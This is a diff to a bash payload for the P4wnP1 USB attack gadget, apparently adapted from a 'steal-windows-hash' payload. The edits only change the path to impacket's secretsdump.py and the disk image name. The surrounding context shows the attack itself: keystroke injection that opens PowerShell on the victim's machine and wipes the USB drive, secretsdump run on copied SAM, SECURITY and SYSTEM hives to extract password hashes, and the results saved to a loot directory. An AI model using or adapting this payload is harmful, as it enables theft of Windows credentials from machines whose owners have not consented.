@@ -4,8 +4,8 @@
 # Based on: https://github.com/PingDucKY/payloads-P4wnP1-A.L.O.A/tree/master/steal-windows-hash
 # You need to have impacket installed
 # sudo apt-get install python-impacket or download and install from https://github.com/SecureAuthCorp/impacket
-# secretsdump.py from the impacket examples folder should be located in: "/usr/local/bin/secretsdump.py" (should already be there in kali linux)
-# Create disk using genimg: /usr/local/P4wnP1/helper/genimg -i -s 50 -o 50mb -l sam
+# secretsdump.py from the impacket examples folder should be located in: "/usr/share/doc/python3-impacket/examples/secretsdump.py" (should already be there in kali linux)
+# Create disk using genimg: /usr/local/P4wnP1/helper/genimg -i -s 50 -o sam -l sam
 # You need to setup P4wnP1 USB Gadget Settings as Keyboard and Mass Storage and mount the disk you created
 # Copy this script to "/usr/local/P4wnP1/scripts/"
 # Create a trigger to start this bash script when USB gadget connected to host
@@ -17,7 +17,7 @@ if [ ! -f /usr/local/P4wnP1/ums/flashdrive/50mb.bin ]; then
   fi
 
 echo "[*] Checking if secretsdump.py is installed..."
-if [ ! -f /usr/local/bin/secretsdump.py ]; then
+if [ ! -f /usr/share/doc/python3-impacket/examples/secretsdump.py ]; then
     echo "[!] secretsdump.py not found!"
     exit 1
   fi
@@ -86,7 +86,7 @@ sleep 5
 echo "[*] Deleting files from mass storage..."
 P4wnP1_cli hid run -c 'layout("us"); press("GUI r"); delay(500); type("powershell\n"); delay(1000); type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \"sam\" } | select name;$drive = $usbPath.name;Remove-Item $drive\\*.*\n");type("exit\n")' >/dev/null
 echo "[*] Dumping hashes..."
-secretsdump.py -sam /tmp/samdata/sam.save -security /tmp/samdata/security.save -system /tmp/samdata/system.save LOCAL > /tmp/samdata/outputsecretdump.txt
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam /tmp/samdata/sam.save -security /tmp/samdata/security.save -system /tmp/samdata/system.save LOCAL > /tmp/samdata/outputsecretdump.txt
 sleep 5
 echo "[*] Copying files to loot directory..."
 cp /tmp/samdata/outputsecretdump.txt $LOOTDIR
